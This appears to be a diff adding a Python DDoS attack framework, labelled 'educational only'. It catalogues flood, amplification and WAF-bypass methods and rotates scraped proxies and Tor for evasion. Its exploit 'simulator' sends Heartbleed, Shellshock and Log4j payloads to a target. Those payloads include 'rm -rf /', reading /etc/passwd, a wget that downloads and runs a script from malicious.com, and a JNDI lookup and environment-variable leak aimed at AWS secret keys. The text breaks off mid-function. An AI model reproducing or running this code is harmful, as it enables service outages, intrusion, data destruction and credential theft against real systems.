@@ -1,0 +1,3173 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+AZUREPW-DDOS-Framework v9.0
+Advanced DDoS Testing Framework - Educational Purposes Only
+Based on https://github.com/petangZi/AZUREPW-DDOS-Framework
+MIT License - For Educational Use Only
+
+WARNING: This tool is for educational purposes only. 
+Using it against systems without permission is illegal and violates laws.
+"""
+
+import os
+import sys
+import time
+import random
+import socket
+import threading
+import requests
+import ssl
+import base64
+import hashlib
+import subprocess
+import json
+import re
+import asyncio
+import aiohttp
+import websockets
+import psutil
+import platform
+from urllib.parse import urlparse, urlencode
+from datetime import datetime, timedelta
+from collections import deque, defaultdict
+import concurrent.futures
+import traceback
+from bs4 import BeautifulSoup
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+import socks
+import stem.process
+from stem import Signal
+from stem.control import Controller
+from fake_useragent import UserAgent
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import ipaddress
+from concurrent.futures import ThreadPoolExecutor
+
+# ===================== LICENSE & DISCLAIMER =====================
+LICENSE = """
+MIT License
+
+Copyright (c) 2024 AZUREPW-DDOS-Framework
+Based on https://github.com/petangZi/AZUREPW-DDOS-Framework
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+DISCLAIMER: THIS SOFTWARE IS PROVIDED "AS IS" FOR EDUCATIONAL PURPOSES ONLY.
+THE AUTHORS ARE NOT RESPONSIBLE FOR ANY ILLEGAL USE. USING THIS SOFTWARE
+AGAINST SYSTEMS WITHOUT PERMISSION IS STRICTLY PROHIBITED AND VIOLATES LAWS.
+"""
+
+DISCLAIMER = """
+⚠️  EDUCATIONAL PURPOSES ONLY ⚠️
+This tool is designed for educational purposes and security testing in authorized environments only.
+Using this tool against any system without explicit permission is illegal and violates:
+- UU ITE Pasal 30 (Indonesia): 12 years imprisonment + Rp 12 billion fine
+- Computer Fraud and Abuse Act (USA): Up to 20 years imprisonment
+- NIS Directive (EU): Up to 5 years imprisonment + €500,000 fine
+
+By using this software, you agree to:
+1. Use it only for educational purposes
+2. Test only on systems you own or have written permission
+3. Take full responsibility for your actions
+4. Not use it for any illegal activities
+
+THE AUTHORS ARE NOT RESPONSIBLE FOR ANY MISUSE OR ILLEGAL ACTIVITIES.
+"""
+
+# ===================== AUTO-CHECK DEPENDENCIES =====================
+def check_dependencies():
+    """Check and install required dependencies"""
+    required_packages = [
+        'scapy', 'requests', 'selenium', 'beautifulsoup4', 
+        'fake-useragent', 'stem', 'PySocks', 'pycryptodome', 
+        'lxml', 'aiohttp', 'websockets', 'asyncio', 'psutil',
+        'dnspython', 'paramiko', 'pyopenssl', 'ipaddress',
+        'hyper'
+    ]
+    
+    missing_packages = []
+    for package in required_packages:
+        try:
+            __import__(package.replace('-', '_'))
+        except ImportError:
+            missing_packages.append(package)
+    
+    if missing_packages:
+        print("[✗] Missing packages:", ", ".join(missing_packages))
+        print("[!] Installing missing packages...")
+        for package in missing_packages:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+        print("[✓] All packages installed!")
+
+check_dependencies()
+
+# ===================== IMPORT MODULES =====================
+try:
+    from scapy.all import *
+    from scapy.layers.inet import IP, TCP, UDP, ICMP
+    from scapy.layers.dns import DNS, DNSQR, DNSRR
+    from scapy.layers.ntp import NTP
+    from scapy.layers.snmp import SNMP, SNMPvarbind
+    from scapy.layers.tls.all import *
+    from scapy.layers.l2 import Ether, Dot1Q, ARP
+    # from scapy.layers.bgp import BGPHeader, BGPOpen  # Removed: not available in all scapy versions
+    BGPHeader = None
+    BGPOpen = None
+    from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6Packet
+    import dns.resolver
+    import paramiko
+    from OpenSSL import SSL
+except ImportError as e:
+    print(f"[✗] Import error: {e}")
+    sys.exit(1)
+
+# ===================== GLOBAL VARIABLES =====================
+# Initialize all global variables to avoid missing variable errors
+TARGET_IP = ""
+TARGET_URL = ""
+TARGET_DOMAIN = ""
+DURATION = 600
+THREADS = 500
+PROTOCOL = "https"
+PROXY_LIST = []
+SCRAPED_PROXIES = []
+TOR_PROXY = None
+ADAPTATION_ENABLED = True
+AUTO_SCRAPE_PROXY = True
+PERFECT_MODE = True
+VPS_SIMULATION = True
+LOAD_BALANCING = True
+FULL_METHODS = True
+targets = []
+
+# VPS Simulation Configuration
+VPS_NODES = []
+MAX_VPS_NODES = 15
+VPS_CONFIG = {
+    "cpu_cores": [2, 4, 8, 16, 32],
+    "memory_gb": [4, 8, 16, 32, 64],
+    "bandwidth_mbps": [100, 1000, 10000, 40000],
+    "locations": ["US", "EU", "ASIA", "SA", "AF", "OC"],
+    "providers": ["AWS", "Google Cloud", "Azure", "DigitalOcean", "Linode", "Vultr"]
+}
+
+# Advanced tracking
+ATTACK_STATS = {
+    "hits": 0, "errors": 0, "start_time": None,
+    "method_stats": defaultdict(lambda: {"hits": 0, "errors": 0}),
+    "proxy_stats": defaultdict(lambda: {"success": 0, "error": 0, "latency": 0}),
+    "error_analysis": defaultdict(int),
+    "server_response": defaultdict(int),
+    "adaptation_history": deque(maxlen=2000),
+    "performance_metrics": {
+        "cpu_usage": 0,
+        "memory_usage": 0,
+        "network_usage": 0,
+        "success_rate": 0,
+        "error_rate": 0
+    },
+    "vps_stats": {
+        "active_nodes": 0,
+        "total_traffic": 0,
+        "cpu_distribution": defaultdict(int),
+        "memory_distribution": defaultdict(int),
+        "network_distribution": defaultdict(int)
+    },
+    "method_effectiveness": defaultdict(float)
+}
+
+# Proxy sources for scraping
+PROXY_SOURCES = [
+    "https://free-proxy-list.net/",
+    "https://sslproxies.org/",
+    "https://us-proxy.org/",
+    "https://free-proxy-list.net/anonymous-proxy.html",
+    "https://www.proxy-list.download/api/v1/get?type=http",
+    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt"
+]
+
+# Attack methods configuration
+ATTACK_METHODS = {
+    "layer3": [
+        "ip_fragmentation",
+        "icmp_flood",
+        "icmp_smurf",
+        "ping_of_death",
+        "land_attack",
+        "teardrop_attack"
+    ],
+    "layer4": [
+        "syn_flood",
+        "syn_ack_flood",
+        "ack_flood",
+        "rst_flood",
+        "fin_flood",
+        "udp_flood",
+        "tcp_storm",
+        "udp_flood_fragmented"
+    ],
+    "amplification": [
+        "dns_amplification",
+        "ntp_amplification",
+        "memcached_amplification",
+        "snmp_amplification",
+        "chargen_amplification",
+        "ssdp_amplification",
+        "ldap_amplification",
+        "tftp_amplification",
+        "portmapper_amplification"
+    ],
+    "layer7": [
+        "http_flood",
+        "http2_flood",
+        "https_flood",
+        "websocket_flood",
+        "graphql_dos",
+        "api_flood",
+        "rest_api_flood",
+        "xmlrpc_flood",
+        "wp_xmlrpc_flood",
+        "drupal_ddos",
+        "joomla_ddos",
+        "magento_ddos"
+    ],
+    "application": [
+        "slowloris",
+        "slow_post",
+        "rudy_attack",
+        "hash_dos",
+        "ssl_exhaustion",
+        "tls_handshake_exhaustion",
+        "http_pipelining",
+        "head_flood",
+        "get_flood",
+        "post_flood"
+    ],
+    "bypass": [
+        "cloudflare_bypass",
+        "waf_bypass",
+        "cdn_bypass",
+        "captcha_bypass",
+        "js_challenge_bypass",
+        "browser_validation_bypass",
+        "honeypot_bypass",
+        "rate_limit_bypass"
+    ],
+    "advanced": [
+        "dns_tunneling",
+        "dns_cache_poisoning",
+        "arp_spoofing",
+        "mac_flooding",
+        "vlan_hopping",
+        "bgp_hijacking_simulation",
+        "ipv6_flood",
+        "icmpv6_flood"
+    ],
+    "specialized": [
+        "cookie_bombing",
+        "session_fixation",
+        "csrf_attack",
+        "xss_dos",
+        "sql_injection_dos",
+        "nosql_injection_dos",
+        "file_upload_bomb",
+        "log_injection",
+        "email_bombing"
+    ],
+    "vps_based": [
+        "vps_cpu_intensive",
+        "vps_memory_intensive",
+        "vps_network_intensive",
+        "vps_mixed_attack",
+        "vps_distributed_attack"
+    ]
+}
+
+# ===================== UTILITY FUNCTIONS =====================
+def load_proxies(proxy_file):
+    """Load proxy dari file"""
+    global PROXY_LIST
+    try:
+        with open(proxy_file, 'r') as f:
+            PROXY_LIST = [line.strip() for line in f if line.strip()]
+        print(f"[✓] Loaded {len(PROXY_LIST)} proxies from {proxy_file}")
+    except FileNotFoundError:
+        print(f"[✗] Proxy file not found: {proxy_file}")
+
+def setup_tor():
+    """Setup Tor proxy"""
+    global TOR_PROXY
+    try:
+        print("[!] Starting Tor proxy...")
+        tor_process = stem.process.launch_tor_with_config(
+            config = {
+                'SocksPort': '9050',
+                'ExitNodes': '{us}'
+            }
+        )
+        TOR_PROXY = "socks5://127.0.0.1:9050"
+        print("[✓] Tor proxy started on port 9050")
+        return tor_process
+    except Exception as e:
+        print(f"[✗] Tor setup failed: {e}")
+        return None
+
+def is_domain(target):
+    """Check if target is domain or IP"""
+    try:
+        ipaddress.ip_address(target)
+        return False
+    except ValueError:
+        return True
+
+def get_network_usage():
+    """Get network usage"""
+    try:
+        net_io = psutil.net_io_counters()
+        return (net_io.bytes_sent + net_io.bytes_recv) / (1024 * 1024)
+    except:
+        return 0
+
+# ===================== VPS SIMULATION =====================
+class VPSNode:
+    """Simulate a single VPS node"""
+    def __init__(self, node_id):
+        self.node_id = node_id
+        self.cpu_cores = random.choice(VPS_CONFIG["cpu_cores"])
+        self.memory_gb = random.choice(VPS_CONFIG["memory_gb"])
+        self.bandwidth_mbps = random.choice(VPS_CONFIG["bandwidth_mbps"])
+        self.location = random.choice(VPS_CONFIG["locations"])
+        self.provider = random.choice(VPS_CONFIG["providers"])
+        self.ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        self.active = True
+        self.cpu_usage = 0
+        self.memory_usage = 0
+        self.network_usage = 0
+        self.threads = []
+        self.attack_count = 0
+        
+    def generate_headers(self):
+        """Generate headers that mimic this VPS"""
+        ua = UserAgent()
+        
+        provider_headers = {
+            "AWS": {
+                "User-Agent": "Amazon CloudFront",
+                "X-Amz-Cf-Id": f"{random.randint(100000, 999999)}",
+                "X-Amzn-Trace-Id": f"Root={random.randint(100000000, 999999999)}"
+            },
+            "Google Cloud": {
+                "User-Agent": "Google Cloud Load Balancer",
+                "X-Cloud-Trace-Context": f"{random.randint(100000, 999999)}/{random.randint(100000, 999999)}/{random.randint(1000000, 9999999)}"
+            },
+            "Azure": {
+                "User-Agent": "Azure App Service",
+                "X-MS-Region": self.location,
+                "X-MS-Request-Id": f"|{random.randint(100000, 999999)}.{random.randint(100000, 999999)}.{random.randint(1000000, 9999999)}"
+            },
+            "DigitalOcean": {
+                "User-Agent": "DigitalOcean",
+                "X-DO-Region": self.location,
+                "X-DO-Droplet-Id": f"{random.randint(100000, 999999)}"
+            },
+            "Linode": {
+                "User-Agent": "Linode",
+                "X-Linode-Region": self.location,
+                "X-Linode-Instance": f"{random.randint(100000, 999999)}"
+            },
+            "Vultr": {
+                "User-Agent": "Vultr",
+                "X-Vultr-Region": self.location,
+                "X-Vultr-Instance": f"{random.randint(100000, 999999)}"
+            }
+        }
+        
+        headers = provider_headers.get(self.provider, {
+            "User-Agent": ua.random
+        })
+        
+        # Add common VPS headers
+        headers.update({
+            "X-Forwarded-For": self.ip,
+            "X-VPS-Provider": self.provider,
+            "X-VPS-Location": self.location,
+            "X-VPS-CPU": str(self.cpu_cores),
+            "X-VPS-Memory": f"{self.memory_gb}GB",
+            "X-VPS-Bandwidth": f"{self.bandwidth_mbps}Mbps",
+            "X-VPS-Node": f"node-{self.node_id}"
+        })
+        
+        return headers
+    
+    def simulate_resource_usage(self, attack_type):
+        """Simulate resource usage based on attack type"""
+        if attack_type == "cpu_intensive":
+            self.cpu_usage = min(100, self.cpu_usage + random.randint(15, 35))
+            self.memory_usage = min(100, self.memory_usage + random.randint(5, 15))
+            self.network_usage = min(100, self.network_usage + random.randint(1, 10))
+        elif attack_type == "memory_intensive":
+            self.cpu_usage = min(100, self.cpu_usage + random.randint(5, 15))
+            self.memory_usage = min(100, self.memory_usage + random.randint(25, 45))
+            self.network_usage = min(100, self.network_usage + random.randint(1, 5))
+        elif attack_type == "network_intensive":
+            self.cpu_usage = min(100, self.cpu_usage + random.randint(1, 10))
+            self.memory_usage = min(100, self.memory_usage + random.randint(1, 5))
+            self.network_usage = min(100, self.network_usage + random.randint(35, 55))
+        else:
+            # Balanced attack
+            self.cpu_usage = min(100, self.cpu_usage + random.randint(10, 20))
+            self.memory_usage = min(100, self.memory_usage + random.randint(10, 20))
+            self.network_usage = min(100, self.network_usage + random.randint(10, 20))
+        
+        # Gradual resource decrease
+        self.cpu_usage = max(0, self.cpu_usage - random.randint(2, 8))
+        self.memory_usage = max(0, self.memory_usage - random.randint(2, 8))
+        self.network_usage = max(0, self.network_usage - random.randint(2, 8))
+        
+        self.attack_count += 1
+    
+    def get_load_factor(self):
+        """Get current load factor for this VPS"""
+        return (self.cpu_usage + self.memory_usage + self.network_usage) / 3
+    
+    def reset_usage(self):
+        """Reset resource usage"""
+        self.cpu_usage = 0
+        self.memory_usage = 0
+        self.network_usage = 0
+
+def initialize_vps_nodes(num_nodes):
+    """Initialize virtual VPS nodes"""
+    global VPS_NODES
+    VPS_NODES = []
+    
+    for i in range(num_nodes):
+        node = VPSNode(i + 1)
+        VPS_NODES.append(node)
+        print(f"[✓] VPS Node {node.node_id} created: {node.provider} {node.location} "
+              f"({node.cpu_cores}CPU, {node.memory_gb}GB RAM, {node.bandwidth_mbps}Mbps)")
+    
+    ATTACK_STATS["vps_stats"]["active_nodes"] = len(VPS_NODES)
+
+# ===================== LOAD BALANCER =====================
+class LoadBalancer:
+    """Advanced load balancer for VPS nodes"""
+    def __init__(self):
+        self.strategies = {
+            "round_robin": self.round_robin,
+            "least_connections": self.least_connections,
+            "least_cpu": self.least_cpu,
+            "least_memory": self.least_memory,
+            "least_network": self.least_network,
+            "weighted": self.weighted,
+            "least_load": self.least_load,
+            "random": self.random
+        }
+        self.current_strategy = "round_robin"
+        self.current_index = 0
+        self.strategy_history = deque(maxlen=100)
+        
+    def select_node(self, attack_type="balanced"):
+        """Select the best VPS node for the attack"""
+        active_nodes = [node for node in VPS_NODES if node.active]
+        
+        if not active_nodes:
+            return None
+        
+        return self.strategies[self.current_strategy](active_nodes, attack_type)
+    
+    def round_robin(self, nodes, attack_type):
+        """Round-robin selection"""
+        node = nodes[self.current_index % len(nodes)]
+        self.current_index += 1
+        return node
+    
+    def least_connections(self, nodes, attack_type):
+        """Select node with least connections"""
+        return min(nodes, key=lambda x: len(x.threads))
+    
+    def least_cpu(self, nodes, attack_type):
+        """Select node with least CPU usage"""
+        return min(nodes, key=lambda x: x.cpu_usage)
+    
+    def least_memory(self, nodes, attack_type):
+        """Select node with least memory usage"""
+        return min(nodes, key=lambda x: x.memory_usage)
+    
+    def least_network(self, nodes, attack_type):
+        """Select node with least network usage"""
+        return min(nodes, key=lambda x: x.network_usage)
+    
+    def weighted(self, nodes, attack_type):
+        """Weighted selection based on resources"""
+        for node in nodes:
+            node.weight = (100 - node.cpu_usage) + (100 - node.memory_usage) + (100 - node.network_usage)
+        
+        return max(nodes, key=lambda x: x.weight)
+    
+    def least_load(self, nodes, attack_type):
+        """Select node with least overall load"""
+        return min(nodes, key=lambda x: x.get_load_factor())
+    
+    def random(self, nodes, attack_type):
+        """Random selection"""
+        return random.choice(nodes)
+    
+    def adapt_strategy(self):
+        """Adapt load balancing strategy based on conditions"""
+        total_cpu = sum(node.cpu_usage for node in VPS_NODES) / len(VPS_NODES)
+        total_memory = sum(node.memory_usage for node in VPS_NODES) / len(VPS_NODES)
+        total_network = sum(node.network_usage for node in VPS_NODES) / len(VPS_NODES)
+        
+        old_strategy = self.current_strategy
+        
+        if total_cpu > 80:
+            self.current_strategy = "least_cpu"
+        elif total_memory > 80:
+            self.current_strategy = "least_memory"
+        elif total_network > 80:
+            self.current_strategy = "least_network"
+        elif total_cpu > 60 and total_memory > 60:
+            self.current_strategy = "least_load"
+        else:
+            self.current_strategy = "weighted"
+        
+        if old_strategy != self.current_strategy:
+            print(f"[✓] Load balancing strategy changed: {old_strategy} → {self.current_strategy}")
+            self.strategy_history.append({
+                "time": time.time(),
+                "old_strategy": old_strategy,
+                "new_strategy": self.current_strategy,
+                "cpu": total_cpu,
+                "memory": total_memory,
+                "network": total_network
+            })
+
+# ===================== AUTO PROXY SCRAPING =====================
+def scrape_proxies():
+    """Scrape proxy dari berbagai sumber dengan optimasi maksimal"""
+    global SCRAPED_PROXIES
+    
+    new_proxies = []
+    
+    for source in PROXY_SOURCES:
+        try:
+            print(f"[!] Scraping proxies from: {source}")
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+            
+            response = requests.get(source, headers=headers, timeout=30)
+            soup = BeautifulSoup(response.text, 'lxml')
+            
+            # Extract proxy berdasarkan format
+            if 'proxy-list.download' in source or 'proxyscrape' in source or 'raw.githubusercontent.com' in source:
+                # API/RAW format
+                proxies = response.text.strip().split('\n')
+                for proxy in proxies:
+                    if ':' in proxy and '.' in proxy:
+                        new_proxies.append(proxy)
+            else:
+                # HTML format
+                proxy_rows = soup.find_all('tr')
+                for row in proxy_rows[1:]:  # Skip header
+                    cols = row.find_all('td')
+                    if len(cols) >= 2:
+                        ip = cols[0].text.strip()
+                        port = cols[1].text.strip()
+                        if ip and port and port.isdigit():
+                            new_proxies.append(f"{ip}:{port}")
+            
+            print(f"[✓] Got {len(new_proxies)} proxies from {source}")
+            time.sleep(1)
+            
+        except Exception as e:
+            print(f"[✗] Failed to scrape {source}: {e}")
+    
+    # Validasi proxy secara paralel
+    valid_proxies = []
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = [executor.submit(validate_proxy, proxy) for proxy in new_proxies[:200]]
+        for future in concurrent.futures.as_completed(futures):
+            proxy, is_valid = future.result()
+            if is_valid:
+                valid_proxies.append(proxy)
+    
+    SCRAPED_PROXIES.extend(valid_proxies)
+    print(f"[✓] Total valid scraped proxies: {len(valid_proxies)}")
+
+def validate_proxy(proxy):
+    """Validasi proxy dengan cepat"""
+    try:
+        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+        response = requests.get(
+            "http://httpbin.org/ip",
+            proxies=proxies,
+            timeout=5
+        )
+        return proxy, response.status_code == 200
+    except:
+        return proxy, False
+
+# ===================== PERFECT ADAPTATION SYSTEM =====================
+class PerfectAdaptationSystem:
+    def __init__(self):
+        self.current_strategy = "balanced"
+        self.strategies = {
+            "conservative": {"threads": 0.2, "timeout": 90, "retries": 2},
+            "balanced": {"threads": 0.5, "timeout": 45, "retries": 3},
+            "aggressive": {"threads": 1.0, "timeout": 20, "retries": 5},
+            "stealth": {"threads": 0.1, "timeout": 120, "retries": 1}
+        }
+        self.performance_history = deque(maxlen=2000)
+        self.server_behavior = {
+            "response_time": 0,
+            "error_rate": 0,
+            "success_rate": 0,
+            "load_status": "normal"
+        }
+        self.method_effectiveness = defaultdict(float)
+        
+    def analyze_performance(self):
+        """Analisis performa secara real-time"""
+        if not ATTACK_STATS["start_time"]:
+            return
+            
+        elapsed = time.time() - ATTACK_STATS["start_time"]
+        if elapsed < 3:
+            return
+            
+        total_requests = ATTACK_STATS["hits"] + ATTACK_STATS["errors"]
+        if total_requests == 0:
+            return
+            
+        success_rate = ATTACK_STATS["hits"] / total_requests
+        error_rate = ATTACK_STATS["errors"] / total_requests
+        hits_per_sec = ATTACK_STATS["hits"] / elapsed
+        
+        response_codes = ATTACK_STATS["server_response"]
+        if response_codes.get(200, 0) > total_requests * 0.8:
+            load_status = "normal"
+        elif response_codes.get(429, 0) > total_requests * 0.3:
+            load_status = "rate_limited"
+        elif response_codes.get(503, 0) > total_requests * 0.3:
+            load_status = "overloaded"
+        else:
+            load_status = "unstable"
+        
+        self.server_behavior = {
+            "response_time": elapsed / total_requests if total_requests > 0 else 0,
+            "error_rate": error_rate,
+            "success_rate": success_rate,
+            "load_status": load_status
+        }
+        
+        ATTACK_STATS["performance_metrics"].update({
+            "success_rate": success_rate,
+            "error_rate": error_rate,
+            "cpu_usage": psutil.cpu_percent(interval=1),
+            "memory_usage": psutil.virtual_memory().percent,
+            "network_usage": get_network_usage()
+        })
+        
+        # Calculate method effectiveness
+        for method_name, stats in ATTACK_STATS["method_stats"].items():
+            total = stats["hits"] + stats["errors"]
+            if total > 0:
+                self.method_effectiveness[method_name] = stats["hits"] / total
+        
+        self.performance_history.append({
+            "time": time.time(),
+            "success_rate": success_rate,
+            "error_rate": error_rate,
+            "hits_per_sec": hits_per_sec,
+            "load_status": load_status,
+            "strategy": self.current_strategy
+        })
+        
+        ATTACK_STATS["hits"] = 0
+        ATTACK_STATS["errors"] = 0
+        ATTACK_STATS["server_response"].clear()
+        
+    def adapt_strategy(self):
+        """Adaptasi strategi dengan AI-like decision making"""
+        old_strategy = self.current_strategy
+        
+        if self.server_behavior["error_rate"] > 0.9:
+            self.current_strategy = "conservative"
+            print(f"[!] Critical error rate ({self.server_behavior['error_rate']:.2%}) - Emergency conservative mode")
+        elif self.server_behavior["success_rate"] > 0.95 and self.server_behavior["load_status"] == "normal":
+            self.current_strategy = "aggressive"
+            print(f"[!] Excellent success rate ({self.server_behavior['success_rate']:.2%}) - Maximum aggressive mode")
+        elif self.server_behavior["load_status"] == "rate_limited":
+            self.current_strategy = "stealth"
+            print(f"[!] Server rate limited - Activating stealth mode")
+        elif self.server_behavior["load_status"] == "overloaded":
+            self.current_strategy = "balanced"
+            print(f"[!] Server overloaded - Balanced mode")
+        elif self.server_behavior["success_rate"] > 0.8:
+            self.current_strategy = "aggressive"
+            print(f"[!] Good success rate ({self.server_behavior['success_rate']:.2%}) - Aggressive mode")
+        else:
+            self.current_strategy = "balanced"
+        
+        if old_strategy != self.current_strategy:
+            print(f"[✓] Strategy evolved: {old_strategy} → {self.current_strategy}")
+        
+        global THREADS
+        strategy_settings = self.strategies[self.current_strategy]
+        THREADS = int(THREADS * strategy_settings["threads"])
+
+# ===================== AI POWERED OPTIMIZATION =====================
+class AIAttackOptimizer:
+    def __init__(self):
+        self.attack_patterns = defaultdict(list)
+        self.success_matrix = defaultdict(float)
+        self.evolution_history = deque(maxlen=1000)
+        
+    def analyze_attack_effectiveness(self):
+        """Analisis efektivitas attack dengan AI"""
+        current_time = time.time()
+        
+        # Hitung efektivitas per metode
+        for method, stats in ATTACK_STATS["method_stats"].items():
+            total = stats["hits"] + stats["errors"]
+            if total > 0:
+                effectiveness = stats["hits"] / total
+                self.success_matrix[method] = effectiveness
+                
+                # Simpan pattern
+                self.attack_patterns[method].append({
+                    "time": current_time,
+                    "effectiveness": effectiveness,
+                    "server_load": ATTACK_STATS["performance_metrics"]["cpu_usage"]
+                })
+        
+        # Evolusi strategi
+        self.evolve_strategy()
+    
+    def evolve_strategy(self):
+        """Evolusi strategi attack berdasarkan AI"""
+        if not self.success_matrix:
+            return
+            
+        # Cari metode paling efektif
+        best_methods = sorted(
+            self.success_matrix.items(), 
+            key=lambda x: x[1], 
+            reverse=True
+        )[:5]
+        
+        # Cari metode yang menurun performanya
+        declining_methods = []
+        for method, effectiveness in self.success_matrix.items():
+            if len(self.attack_patterns[method]) > 10:
+                recent = self.attack_patterns[method][-5:]
+                avg_recent = sum(p["effectiveness"] for p in recent) / len(recent)
+                if avg_recent < effectiveness * 0.7:  # Turun 30%
+                    declining_methods.append(method)
+        
+        # Update strategi
+        evolution = {
+            "time": time.time(),
+            "best_methods": [m[0] for m in best_methods],
+            "declining_methods": declining_methods,
+            "action": "increase_best" if best_methods else "maintain"
+        }
+        
+        self.evolution_history.append(evolution)
+        
+        # Adjust resource allocation
+        if evolution["action"] == "increase_best":
+            global THREADS
+            THREADS = min(THREADS * 1.2, 2000)  # Max 2000 threads
+            print(f"[AI] Increasing threads to {THREADS} (best methods: {', '.join(evolution['best_methods'][:3])})")
+
+# ===================== ADVANCED EVASION =====================
+class AdvancedEvasion:
+    def __init__(self):
+        self.fingerprint_database = defaultdict(dict)
+        self.behavior_profiles = defaultdict(list)
+        
+    def generate_stealth_headers(self, vps_node):
+        """Generate headers yang susah dideteksi"""
+        ua = UserAgent()
+        
+        # Behavioral fingerprinting
+        behavior_profile = {
+            "mouse_movements": random.randint(10, 50),
+            "keystroke_timing": random.uniform(0.1, 0.5),
+            "scroll_behavior": random.choice(["smooth", "fast", "natural"]),
+            "click_pattern": random.choice(["single", "double", "triple"])
+        }
+        
+        # Generate headers based on behavior
+        headers = {
+            "User-Agent": ua.random,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9"]),
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "none",
+            "Cache-Control": "max-age=0"
+        }
+        
+        # Add behavioral headers
+        headers.update({
+            "X-Behavior-Mouse": str(behavior_profile["mouse_movements"]),
+            "X-Behavior-Keystroke": str(behavior_profile["keystroke_timing"]),
+            "X-Behavior-Scroll": behavior_profile["scroll_behavior"],
+            "X-Behavior-Click": behavior_profile["click_pattern"]
+        })
+        
+        # Add VPS-specific headers
+        headers.update(vps_node.generate_headers())
+        
+        return headers
+    
+    def polymorphic_encoding(self, data):
+        """Encode data dengan polimorfik"""
+        encodings = [
+            base64.b64encode,
+            lambda x: x.hex(),
+            lambda x: ''.join(format(ord(c), '08b') for c in x.decode()),
+            lambda x: x[::-1]  # Reverse
+        ]
+        
+        # Random encoding chain
+        encoding_chain = random.sample(encodings, random.randint(2, 4))
+        
+        encoded = data
+        for encode_func in encoding_chain:
+            encoded = encode_func(encoded)
+        
+        return encoded
+    
+    def timing_obfuscation(self):
+        """Generate timing pattern yang acak"""
+        patterns = [
+            lambda: random.uniform(0.1, 0.5),  # Short delay
+            lambda: random.uniform(1.0, 3.0),  # Medium delay
+            lambda: random.uniform(5.0, 10.0), # Long delay
+            lambda: 0,  # No delay
+            lambda: random.expovariate(1.0)  # Exponential distribution
+        ]
+        
+        return random.choice(patterns)()
+
+# ===================== ZERO-DAY EXPLOIT SIMULATOR =====================
+class ZeroDaySimulator:
+    def __init__(self):
+        self.exploit_database = {
+            "heartbleed": {
+                "cve": "CVE-2014-0160",
+                "target": "OpenSSL",
+                "payload": self.generate_heartbleed_payload
+            },
+            "shellshock": {
+                "cve": "CVE-2014-6271",
+                "target": "Bash",
+                "payload": self.generate_shellshock_payload
+            },
+            "log4j": {
+                "cve": "CVE-2021-44228",
+                "target": "Log4j",
+                "payload": self.generate_log4j_payload
+            }
+        }
+    
+    def generate_heartbleed_payload(self):
+        """Generate Heartbleed payload"""
+        heartbeat = b'\x01'  # Heartbeat Request
+        payload_length = b'\x40\x00'  # 64KB
+        data = b'HEARTBLEED' + b'\x00' * 16
+        
+        return heartbeat + payload_length + data
+    
+    def generate_shellshock_payload(self):
+        """Generate Shellshock payload"""
+        payloads = [
+            "() { :;}; echo 'Shellshock Vulnerable'",
+            "() { :;}; /bin/cat /etc/passwd",
+            "() { :;}; rm -rf /",
+            "() { :;}; wget http://malicious.com/malware.sh -O /tmp/m.sh; chmod +x /tmp/m.sh; /tmp/m.sh"
+        ]
+        
+        return random.choice(payloads)
+    
+    def generate_log4j_payload(self):
+        """Generate Log4j payload"""
+        attack_vectors = [
+            "${jndi:ldap://malicious.com/exploit}",
+            "${jndi:rmi://malicious.com/exploit}",
+            "${jndi:dns://malicious.com/exploit}",
+            "${env:AWS_SECRET_ACCESS_KEY}",
+            "${java:os}"
+        ]
+        
+        return random.choice(attack_vectors)
+    
+    def simulate_zero_day(self, target, exploit_name):
+        """Simulasi zero-day attack"""
+        if exploit_name not in self.exploit_database:
+            return False
+        
+        exploit = self.exploit_database[exploit_name]
+        print(f"[!] Simulating {exploit['cve']} ({exploit['target']}) against {target}")
+        
+        # Generate payload
+        payload = exploit["payload"]()
+        
+        # Send exploit
+        try:
+            if exploit["target"] == "OpenSSL":
+                # Heartbleed simulation
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((target, 443))
+                s.send(payload)
+                response = s.recv(4096)
+                s.close()
+                
+                # Check for memory leak
+                if len(response) > 64:
+                    ATTACK_STATS["hits"] += 1
+                    return True
+                    
+            elif exploit["target"] == "Bash":
+                # Shellshock simulation
+                headers = {"User-Agent": payload}
+                response = requests.get(f"http://{target}/", headers=headers, timeout=10)
+                
+                if "Shellshock" in response.text or "Vulnerable" in response.text:
+                    ATTACK_STATS["hits"] += 1
+                    return True
+                    
+            elif exploit["target"] == "Log4j":
+                # Log4j simulation
+                data = {"user_input": payload}
+                response = requests.post(f"http://{target}/log", json=data, timeout=10)
+                
+                if "exploit" in response.text or "malicious" in response.text:
+                    ATTACK_STATS["hits"] += 1
+                    return True
+                    
+        except Exception as e:
+            ATTACK_STATS["errors"] += 1
+            return False
+        
